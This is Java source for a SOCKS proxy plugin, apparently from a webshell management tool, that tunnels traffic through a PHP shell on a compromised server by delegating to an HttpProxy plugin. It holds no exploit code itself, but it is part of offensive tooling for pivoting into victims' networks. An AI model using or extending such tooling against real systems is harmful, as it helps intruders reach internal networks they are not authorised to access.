package shells.plugins.php;

import com.httpProxy.server.request.HttpRequest;
import com.httpProxy.server.response.HttpResponse;
import core.annotation.PluginAnnotation;
import core.imp.Plugin;
import core.shell.ShellEntity;
import core.socksServer.HttpRequestHandle;
import core.ui.component.dialog.GOptionPane;
import javax.swing.JPanel;
import shells.plugins.generic.HttpProxy;
import shells.plugins.generic.SocksProxy;

@PluginAnnotation(
   payloadName = "PhpDynamicPayload",
   Name = "SocksProxy",
   DisplayName = "Socks代理"
)
public class PSocksProxy extends SocksProxy implements HttpRequestHandle {
   ShellEntity shellEntity;
   HttpProxy httpProxy;

   public PSocksProxy() {
      super((HttpRequestHandle)null);
   }

   public HttpResponse sendHttpRequest(HttpRequest httpRequest) {
      this.httpProxy.load();
      return this.httpProxy.sendHttpRequest(httpRequest);
   }

   public void init(ShellEntity shellEntity) {
      super.init(shellEntity);
      this.shellEntity = shellEntity;
      Plugin plugin = this.shellEntity.getFrame().getPlugin("HttpProxy");
      if (plugin != null) {
         this.httpProxy = (HttpProxy)plugin;
         super.setHttpRequestHandle(this);
      } else {
         GOptionPane.showMessageDialog(super.getView(), "未找到HttpProxy插件!", "提示", 0);
      }

   }

   public JPanel getView() {
      return super.getView();
   }
}
